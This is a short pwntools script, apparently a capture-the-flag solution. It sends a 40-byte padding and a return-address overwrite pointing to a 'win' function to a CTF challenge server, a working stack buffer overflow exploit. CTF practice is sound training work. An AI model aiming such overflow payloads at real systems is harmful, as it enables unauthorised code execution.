from pwn import *

target = remote("pwn.katagaitai-ctf.com", 9012)

win_1 = 0x401474

payload = b"A" * 40
payload += p64(win_1)

target.sendline(payload)
print(target.recvall().decode())